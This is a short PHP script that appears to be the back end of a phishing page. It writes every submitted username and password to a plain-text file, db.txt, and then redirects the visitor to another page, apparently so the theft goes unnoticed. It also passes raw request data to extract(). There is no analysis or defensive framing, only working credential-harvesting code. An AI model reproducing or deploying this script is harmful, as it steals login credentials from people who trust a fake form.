<?php
    extract($_REQUEST);
    $file=fopen("db.txt","a+");

    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: PAMver10.php");
 ?>